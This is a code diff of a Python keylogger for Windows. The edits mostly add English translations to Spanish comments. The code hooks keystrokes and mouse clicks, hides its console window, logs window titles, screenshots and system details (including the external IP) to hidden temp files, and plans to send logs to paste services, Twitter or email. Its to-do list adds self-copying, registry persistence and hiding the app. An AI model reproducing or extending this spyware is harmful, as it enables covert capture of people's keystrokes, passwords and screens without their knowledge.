@@ -36,14 +36,16 @@
 #
 #-----------------------------------------------------------------------------------------------------------
 #
-#
-#   to do
+#   Reminder for future features to do:
 #           - auto clone app / copy to windows tmp
 #           - install in win registry
 #           - send info to paste service
 #           - send info to twitter
 #           - hide app
 #           - command line params: install registry, hide, etc.
+#           - system disk info
+#           - memory info
+#           - server witch sockets connection
 #
 
 import atexit
@@ -68,51 +70,51 @@ import win32gui
 import wx
 
 ########################################################
-# CONSTANTES
+# CONSTANTES - CONSTANTS
 ########################################################
-DEBUG = 1
-CRLF = '\n'                 # salto de linea
-KLGPRE = 'klg_'             # prefijo nombre ficheros de log
-KLGEXT = '.pkl'             # extension nombre ficheros keylogger
-KEYCODE_EXIT = 7            # CTRL + G > combinación especial para cerrar keylogger
+VERSIONS = "1.0"            # Version
+DEBUG = 1                   # Enable Debug
+CRLF = '\n'                 # salto de linea - line feed
+KLGPRE = 'klg_'             # prefijo nombre ficheros de log - prefix name for log files
+KLGEXT = '.dek'             # extension nombre ficheros keylogger - extension file name for keylogger
+KEYCODE_EXIT = 7            # CTRL + G > combinación especial para cerrar keylogger - key to close keylogger
 
 
 ########################################################
-# VARIABLES GLOBALES
+# VARIABLES GLOBALES - GLOBAL VARIABLES
 ########################################################
 
-# contador de teclas presionadas
+# Contador de teclas presionadas - key counter : Future use. At the moment without utility.
 key_counter = 0
 
-# control evento anterior
+# Control evento anterior - Previous event control
+# Used to detect when the user changes the window or application.
 old_event = None
 
-# buffer de caracteres. hasta que no se llena, no se graba en el fichero en disco
-# de esta manera se evitan escrituras contínuas a disco por cada tecla pulsada
-# cuando de supera el limite de key_max_chars se graba el buffer a disco
+# Buffer de caracteres. hasta que no se llena, no se graba en el fichero en disco de esta manera se evitan escrituras
+# contínuas a disco por cada tecla pulsada cuando de supera el limite de key_max_chars se graba el buffer a disco.
+# Character buffer. until it is full, it is not written to the file on disk in this way continuous writes to disk are
+# avoided for each key pressed when the key_max_chars limit is exceeded the buffer is written to disk
 key_max_chars = 25
 key_buffer = ''
 
-# control de tamaño de archivo (en bytes) que activa que se envie a almacenamiento remoto
-# cuando el tamaño del fichero de keylog supera este tamaño entoces se envia el fichero
-# seguidamente se borra y se crea un nuevo fichero de keylog
+# Control de tamaño de archivo (en bytes) que activa que se envie a almacenamiento remoto cuando el tamaño del fichero
+# de keylog supera este tamaño entoces se envia el fichero seguidamente se borra y se crea un nuevo fichero de keylog.
+# File size control (in bytes) that activates to be sent to remote storage when the size of the keylog file exceeds
+# this size, then the file is sent, then it is deleted and a new keylog file is created.
 file_size_trigger = 4096
 
-# ruta y nombre archivo keylog. se asigna el nombre en la función create_keylog_file()
+# Ruta y nombre archivo keylog. Se asigna el nombre en la función create_keylog_file()
+# Path and file name keylog. The name is assigned in the create_keylog_file () function
 keylog_name = ''
 
-
-# to do
-#   - system disk info
-#   - memory info
-
-# control de threads
+# Control de threads - Thread Control
 threadLock = threading.Lock()
 threadList = []
 
 
 ########################################################
-# CLASES
+# CLASES - CLASSES
 ########################################################
 
 # Clase con metodo que toma captura de pantalla y despues la envia
@@ -136,7 +138,7 @@ class ScreenShootThread (threading.Thread):
 
 
 ########################################################
-# FUNCIONES
+# FUNCIONES - FUNCTIONS
 ########################################################
 
 '''
@@ -199,19 +201,19 @@ def send_email(message):
         pass
 
 
-# oculta ventana de aplicación
+# Oculta la ventana de la aplicación - Hide the application window
 def hide_console():
     window = win32console.GetConsoleWindow()
     win32gui.ShowWindow(window,0)
     return True
 
 
-# obtiene la ip externa
+# Obtiene la ip externa - Get the external ip
 def get_external_ip():
     return urllib.request.urlopen('https://ident.me').read().decode('utf8')
 
 
-# añade información inicial de información al fichero de keylog
+# Añade información inicial al fichero de keylog - Add initial information to the keylog file
 def register_system_info():
     global key_buffer
 
@@ -231,7 +233,8 @@ def register_system_info():
     return True
 
 
-# guarda el nombre de la ventana activa y lo añade al fichero de log de teclas
+# Guarda el nombre de la ventana activa y lo añade al fichero de keylog
+# Save the name of the active window and add it to the keylog file
 def register_window_name(text):
     global key_buffer
     key_buffer += CRLF + CRLF + '[WINDOW NAME] ' + text + CRLF
@@ -239,9 +242,10 @@ def register_window_name(text):
     return True
 
 
-# registra una captura de pantalla, añade el nombre al fichero de keylog
-# y seguidamente inicia un thread para su grabación en disco
-# y envio al servicio externo
+# Registra una captura de pantalla, añade el nombre al fichero de keylog y seguidamente inicia un thread para su
+# grabación en disco y envio al servicio externo.
+# Register a screenshot, add the name to the keylog file and then start a thread for recording to disk and send
+# it to the external service.
 def capture_screen():
     global key_buffer
     screen_file = 'scr' + datetime.datetime.now().strftime("%y%m%d%H%M") + '.png'
@@ -251,25 +255,24 @@ def capture_screen():
     return
 
 
-# ejecuta las acciones necesarias para enviar el fichero de keylog
-# a los diferentes recursos o servicios que se hayan definido
+# Ejecuta las acciones necesarias para enviar el fichero de keylog a los diferentes recursos o servicios
+# que se hayan definido.
+# Execute the necessary actions to send the keylog file to the different resources or services that have been defined.
 def send_keylog_file():
     global keylog_name
-
     '''
-	Aqui envia el fichero al servidor  o servicios configurados
-	Hacer un 'paste' en un servidor
-	Publicar un tweet en cuenta privada con la url del paste
-	Opcionalmente hace envio por email para pruebas
+    Aqui envia el fichero al servidor  o servicios configurados
+    Hacer un 'paste' en un servidor
+    Publicar un tweet en cuenta privada con la url del paste
+    Opcionalmente hace envio por email para pruebas
     '''
-
     return True
 
 
-# borra todos los ficheros temporales del keylog
+# Borra todos los ficheros temporales del keylog - Delete all temporary keylog files
 def delete_keylog_tempfile(pattern = None):
-    if pattern == None:                     # si no se recibe nombre de fichero por defecto borra todos los ficheros de keylog
-        pattern = KLGPRE+"*"+KLGEXT
+    if pattern == None:                     # Si no se recibe patron, por defecto borra todos los ficheros de keylog
+        pattern = KLGPRE+"*"+KLGEXT         # If no pattern is received, by default it deletes all keylog files
 
     folder_files = tempfile.gettempdir() + "\\" + pattern
     for file_remove in glob.glob(folder_files):
@@ -279,32 +282,32 @@ def delete_keylog_tempfile(pattern = None):
     return
 
 
-# crea fichero de keylog
+# Crea fichero de keylog - Create keylog file
 def create_keylog_file():
     global keylog_name, key_buffer
 
-    # crea fichero de keylog en la carpeta temporal del usuario
+    # Crea fichero de keylog en la carpeta temporal del usuario
+    # Create keylog file in the user's temporary folder
     prefix = KLGPRE + datetime.datetime.now().strftime("%y%m%d%H%M")
     ftemp, keylog_name = tempfile.mkstemp(KLGEXT, prefix)
     logging.debug('Create keylogger file ' + keylog_name)
     f = open(keylog_name, 'w+')
     f.close()
 
-    key_buffer = ''                         # nos aseguramos de tener el buffer vacio
-    register_system_info()                  # guardamos información general del sistema
+    key_buffer = ''                     # Nos aseguramos de tener el buffer vacio - Empty buffer
+    register_system_info()              # Guardamos información general del sistema - Save system info
     return True
 
 
-# funcion que vacia el buffer del teclado sobre el fichero de disco
+# Vacia el buffer del teclado sobre el fichero de disco - Empty the keyboard buffer over the disk file
 def flush_key_buffer_to_disk():
     global key_buffer, keylog_name
 
-    # añade buffer a ficher de disco
+    # Añade buffer a fichero de disco - Append to file
     f = open(keylog_name, 'a')
     f.write(key_buffer)
     f.close()
 
-    # vacia buffer de teclado
     key_buffer = ''
     return True
 
@@ -439,10 +442,10 @@ def on_close_program():
 # MAIN
 ########################################################
 
-# establece log de depuración
+# Establece log de depuración - Set debug log
 logging.basicConfig(filename='pkLogger.log',filemode='w',level=logging.DEBUG, format='%(asctime)s - %(levelname)s : %(message)s')
 
-# inicializa variables con información del sistema y el usuario
+# Inicializa variables con información del sistema y el usuario - Init some useful variables
 cpu = platform.processor()
 operating_system = platform.platform()
 hostname = socket.gethostname()
@@ -453,31 +456,32 @@ execname = sys.argv[0]                              # modo alternativo > execnam
 extension = os.path.splitext(__file__)[1]
 driveunit = os.path.splitdrive(__file__)[0]
 
-# parsea parametros recibidos
+# Parsea parametros recibidos - Parse parameters
 parse_params()
 
-# oculta ventana de aplicación
+# Oculta ventana de aplicación - Hide console Window
 hide_console()
 
-# borra todos los archivos de keylog antiguos (si existen)
+# Borra todos los archivos de keylog antiguos (si existen) - Delete old keylog files if exists
 delete_keylog_tempfile()
 
-# crea el archivo que registra las teclas
+# Crea el archivo que registra las teclas - Create new keylog file
 create_keylog_file()
 
-# crea el objeto hook manager
+# Crea el objeto hook manager - Creates new hook manager
 hm = pyHook.HookManager()
 
-# registras callbacks de control de eventos
+# Registra callbacks de control de eventos - Register event callbacks
 hm.MouseAllButtonsDown = on_mouse_event
 hm.KeyDown = on_keyboard_event
 
-# establece el hook de eventos de ratón y teclado
+# Establece el hook de eventos de ratón y teclado - Sets hook for Mouse and Keyboard
 hm.HookMouse()
 hm.HookKeyboard()
 
-# registra handler de la función que se ejecutará al terminar la aplicación
+# Registra handler de la función que se ejecutará al terminar la aplicación
+# Handler to do actions when application is closed
 atexit.register(on_close_program)
 
-# espera indefinidamente hasta que se produce combinación de salida del keylogger
+# Espera indefinidamente hasta que se produce combinación de salida del keylogger - Wait indefinitely
 pythoncom.PumpMessages()
